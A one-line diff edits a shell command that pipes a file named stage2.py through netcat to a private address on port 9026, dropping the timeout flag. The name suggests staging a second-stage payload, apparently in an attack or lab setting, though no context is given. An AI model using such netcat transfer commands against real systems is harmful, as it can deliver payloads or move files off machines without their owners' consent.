@@ -1,1 +1,1 @@
-cat stage2.py | nc -w 1 192.168.1.100 9026
+cat stage2.py | nc 192.168.1.100 9026
